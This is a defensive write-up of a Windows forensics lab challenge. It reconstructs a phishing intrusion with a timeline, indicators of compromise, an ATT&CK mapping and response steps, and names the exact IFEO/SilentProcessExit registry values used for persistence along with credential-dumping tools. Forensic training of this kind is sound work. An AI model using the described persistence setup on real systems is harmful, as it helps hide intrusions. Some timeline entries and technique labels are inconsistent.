## ⏱️ Complete Attack Timeline — Reconstructed from All Artifacts

| Timeline | Event | Artifact Source | Evidence |
|----------|-------|---|---|
| **2022-08-21 13:02:23** | 🔴 Phishing email received; malicious document dropped | MFT $FILE_NAME | SecurityPatch.exe created on Desktop |
| **2022-08-21 13:03:33** | 🔴 Document deleted to cover tracks | Recycle Bin ($I file) | `Security Awareness.docx` moved to trash, deleted timestamp |
| **2022-08-21 13:02:23** | 🚨 File timestamps modified (timestomp) | MFT $SI vs $FN | $SI set to 2021-12-25, $FN shows 2022-08-21 |
| **2022-09-08 14:30:31** | 🔴 Stage 2 payload created | MFT $FILE_NAME | GetPatch.exe created in Documents folder |
| **2022-09-08 14:32:12** | 🚨 GetPatch.exe timestamps tampered | MFT $SI vs $FN | Timestomp attempt |
| **2022-09-09 13:25:09** | 🔴 SecurityPatch.exe executed | Amcache | Proof of execution from Amcache hive |
| **2022-09-09 16:13:35** | 🚨 IFEO persistence set on explorer.exe | Registry Explorer | GlobalFlags = 0x200 set in Image File Execution Options |
| **2022-09-09 16:13:35** | 🚨 SilentProcessExit handler configured | Registry Explorer | MonitorProcess = GetPatch.exe in SilentProcessExit key |
| **2022-09-08 14:37:40** | 🔴 RDP lateral movement to 192.168.18.8 | Event Viewer — RDPClient | Event ID 1102: Multi-transport connection initiated |
| **2022-09-08 14:3?:??** | 🔴 Reconnaissance on remote host | RDP Bitmap Cache | `net localgroup` command executed |
| **2022-09-08 14:3?:??** | 🔴 Mimikatz downloaded & executed | RDP Bitmap Cache | Credential dumping from LSASS memory |
| **2022-09-08 14:3?:??** | 🔴 PowerView/PowerSploit executed | RDP Bitmap Cache | Active Directory reconnaissance |
| **2022-08-21 13:14:42** | 🚨 Metasploit getsystem (privilege escalation) | DeepBlueCLI (Event 7045) | Suspicious service creation with named pipe |
| **[Ongoing]** | 🔴 Persistence active | IFEO registry | GetPatch.exe launches every time explorer.exe exits |

---

## 🧾 IOC Table (Indicators of Compromise)

| Type | Value | Context |
|---|---|---|
| **Machine (Initial)** | `DESKTOP-B48JERU` | First compromised endpoint |
| **Machine (Remote)** | `192.168.18.8` | Secondary target machine |
| **User** | `CyberJunkie` | Compromised user account |
| **File** | `Security Awareness.docx` | Phishing document (initial vector) |
| **File** | `SecurityPatch.exe` | Stage 1 payload (Desktop) |
| **File** | `GetPatch.exe` | Stage 2 payload (Documents) |
| **SHA1** | `212636fc48e154ab556af5dd35981fa4442749f7` | SecurityPatch.exe hash |
| **Registry Key** | `HKLM\...\Image File Execution Options\explorer.exe` | IFEO persistence |
| **Registry Key** | `HKLM\...\SilentProcessExit\explorer.exe` | SilentProcessExit handler |
| **Registry Value** | `GlobalFlags = 0x200` | Process exit monitoring trigger |
| **Registry Value** | `MonitorProcess = C:\Users\CyberJunkie\Documents\GetPatch.exe` | Persistence payload |
| **Port/Protocol** | `RDP (TCP 3389)` | Lateral movement protocol |
| **Tool** | `Mimikatz` | Credential dumping (LSASS) |
| **Tool** | `PowerView/PowerSploit` | AD reconnaissance framework |
| **Timestamp** | `2022-08-21 13:02:23` | Initial compromise (Security Awareness.docx) |
| **Timestamp** | `2022-09-09 13:25:09` | SecurityPatch.exe execution (persistence activation) |
| **Timestamp** | `2022-09-08 14:37:40` | RDP lateral movement |

---

## 🗺️ MITRE ATT&CK Mapping — Complete Attack Chain

| Phase | Tactic | Technique | ID | Evidence |
|---|---|---|---|---|
| **Initial Access** | Social Engineering | Phishing: Malicious Link | T1193 | Phishing email with attachment |
| **Execution** | User Execution | Malicious File | T1204.002 | Security Awareness.docx opened by user |
| **Persistence** | Event Triggered Execution | IFEO Injection | T1546.012 | IFEO registry keys + SilentProcessExit |
| **Defense Evasion** | Indicator Removal | Timestomp | T1070.006 | $SI vs $FN timestamp mismatch |
| **Lateral Movement** | Remote Services | RDP | T1021.001 | RDP Client log to 192.168.18.8 |
| **Discovery** | Permission Groups | Local Groups | T1069.001 | `net localgroup` commands in RDP cache |
| **Credential Access** | OS Credential Dumping | LSASS Memory | T1003.001 | Mimikatz execution on remote host |
| **Discovery** | Domain/Account Discovery | Domain Groups | T1087.002 | PowerView enumeration in RDP cache |
| **Privilege Escalation** | Access Token Manipulation | Token Impersonation | T1134.002 | Metasploit getsystem (named pipe) |
| **Command & Control** | Command Line Interface | PowerShell | T1059.001 | PowerShell cradles, PowerView execution |

---

## 🚨 Incident Response Actions — IMMEDIATE

| Priority | Action | Rationale |
|---|---|---|
| 🔴 Critical | **Isolate all three affected systems** | Prevent further lateral movement and C2 communication |
| 🔴 Critical | **Preserve forensic evidence** | Collect full memory dump, all registry hives, all event logs before shutdown |
| 🔴 Critical | **Identify compromised user accounts** | Who has access to `CyberJunkie` machine? Who accessed 192.168.18.8? |
| 🔴 Critical | **Block RDP access network-wide** | Prevent attacker lateral movement via RDP |
| 🟠 High | **Search for persistence on all other machines** | Look for same IFEO/SilentProcessExit pattern on other endpoints |
| 🟠 High | **Check Domain Controller for compromise** | PowerView + Mimikatz on 192.168.18.8 suggests domain compromise attempt |
| 🟠 High | **Review domain admin activity logs** | Check for unauthorized admin account creation or privilege elevation |
| 🟠 High | **Recover USB device** | If Mimikatz/PowerView output was exfiltrated via USB |
| 🟡 Medium | **Implement GPO to disable IFEO** | Group Policy setting to alert on IFEO registry modifications |
| 🟡 Medium | **Deploy YARA rules for SecurityPatch/GetPatch** | Hunt for these files on other machines |
| 🟡 Medium | **Enable Registry auditing** | Alert on any Image File Execution Options modifications |
| 🟡 Medium | **Review PowerShell execution logs** | Find all PowerShell invocations that downloaded/executed tools |

---

## 📋 What to Investigate Next

**1. Identify Patient Zero**
```
Which user account was active on CyberJunkie at 13:02:23 (phishing time)?
Tool: NTUSER.DAT → UserAssist (tracks GUI application execution)
Tool: Event logs → Event ID 4624 (logon events)
```

**2. Find Credentials Stolen from 192.168.18.8**
```
Mimikatz dumped LSASS memory.
Where were those credentials used?
Tool: Check network logs for authentication from unusual IPs/machines
Tool: Check domain controller Event ID 4768 (TGT request) for anomalies
```

**3. Was Data Exfiltrated?**
```
PowerView/Mimikatz output valuable to attacker.
Check for:
- Outbound file transfers during RDP session (192.168.18.8 → external IP)
- Email activity from compromised accounts
- USB device activity during the window
```

**4. Locate Mimikatz & PowerView Source**
```
Where did the attacker download Mimikatz from?
Tool: RDP Bitmap Cache — extract more tiles to see full URLs
Tool: Network logs during 14:37:40 timeframe
Tool: DNS logs for beacon/C2 communications
```

**5. Check for Additional RDP Sessions**
```
Was this the ONLY RDP connection from CyberJunkie?
Tool: Windows Event Log → Microsoft-Windows-TerminalServices-RDPClient\Operational
      Look for other Event ID 1024/1025 (connection attempts)
```

**6. Scan for Malware on Other Network Machines**
```
This attacker compromised at least 3 machines per scenario.
Find the other two using:
Tool: Network-wide PowerShell sweep for SecurityPatch.exe / GetPatch.exe
Tool: Check all machines for IFEO\explorer.exe registry key
Tool: Hunt for Amcache entries showing Mimikatz execution
```

---

## 📝 Lessons Learned

> **The attacker operated with surgical precision. They spent 19 days between initial compromise and persistence activation, suggesting careful planning or staged delivery. Once persistence was established, they immediately moved laterally and began credential harvesting. This was not opportunistic malware — it was a focused, methodical attack.**

Key takeaways:

1. **IFEO + SilentProcessExit is a powerful persistence combination** — most organizations don't monitor these registry keys. This attack would have persisted across reboots indefinitely without detection.

2. **Timestomping is not foolproof** — The attacker attempted to hide file timestamps, but MFT Explorer revealed the real creation time via the $FILE_NAME timestamp (which the OS kernel cannot be tricked into setting incorrectly).

3. **Registry timestamps are forensically valuable** — The exact 16:13:35 timestamp on both IFEO and SilentProcessExit keys allowed us to identify the exact moment persistence was activated.

4. **RDP Bitmap Cache is an intelligence goldmine** — The attacker's tool usage, recon commands, and exact actions on the remote machine were all captured in bitmap form. Even sophisticated attackers can't avoid leaving graphical traces.

5. **Amcache bridges the gap between deletion and execution** — Even though the phishing document was deleted from Recycle Bin, Amcache proved that SecurityPatch.exe was executed.

6. **Cross-artifact correlation is essential** — A single artifact is suspicious. But when Amcache execution timestamp, MFT creation timestamp, registry modification timestamp, and RDP client log all align to the same date/time, it becomes court-admissible proof.

7. **19-day delay between initial access and persistence suggests planning** — This wasn't a spray-and-pray attack. The attacker had a timeline, waited for the right moment, and then activated persistence. This indicates either staged multi-phase malware or attacker command-and-control.

---

## 📚 References & Resources

| Resource | Link |
|---|---|
| **MITRE ATT&CK Framework** | https://attack.mitre.org/ |
| **Eric Zimmermann Tools** | https://ericzimmerman.github.io/ |
| **DeepBlueCLI GitHub** | https://github.com/SEC505/DeepBlueCLI |
| **Windows Event Log IDs** | https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/ |
| **NTFS Forensics** | https://forensicswiki.org/wiki/NTFS |
| **Windows Registry Forensics** | https://digital-forensics.sans.org/blog/ |
| **RDP Cache Analysis** | https://github.com/ANSSI-FR/bmc-tools |
| **LetsDefend Windows Forensics** | https://app.letsdefend.io/challenge/windows-forensics |

---

## 🎓 Forensic Techniques Demonstrated

### Artifact 1: Recycle Bin Analysis
**Why we used it:** Recover deleted phishing document and prove deletion timestamp
**Tool:** RBCmd
**Learning:** $I files persist even after emptying recycle bin

### Artifact 2: MFT Timestomp Detection
**Why we used it:** Prove attacker modified file creation timestamps
**Tool:** MFT Explorer
**Learning:** $FILE_NAME timestamps are reliable; $STANDARD_INFORMATION can be forged

### Artifact 3: Amcache Execution History
**Why we used it:** Prove SecurityPatch.exe executed despite being dropped 19 days prior
**Tool:** AmcacheParser
**Learning:** Amcache survives even after file deletion and recycle bin clearance

### Artifact 4: Registry IFEO Persistence
**Why we used it:** Identify persistence mechanism that survives reboot
**Tool:** Registry Explorer
**Learning:** IFEO + SilentProcessExit is a powerful persistence combination

### Artifact 5: RDP Client Logs
**Why we used it:** Confirm lateral movement to 192.168.18.8
**Tool:** Event Viewer / RDP Client log
**Learning:** RDP client logs record IP address of remote machine

### Artifact 6: RDP Bitmap Cache
**Why we used it:** Reconstruct exact commands executed on remote machine
**Tool:** BMC-Tools
**Learning:** Bitmap cache preserves visual evidence of attacker actions

### Artifact 7: DeepBlueCLI Event Log Analysis
**Why we used it:** Automatically identify privilege escalation techniques
**Tool:** DeepBlueCLI PowerShell script
**Learning:** Automation helps find attack patterns in large event logs

### Artifact 8: ShellBags Folder Navigation
**Why we used it:** Track which folders user accessed on USB/network
**Tool:** ShellBags Explorer
**Learning:** ShellBags persist long after USB is removed

---

*Writeup by: Moetez Bouchlaghem*
*SOC-Investigation-Lab | GhnimiWael*
*Lab Source: https://app.letsdefend.io/challenge/windows-forensics*
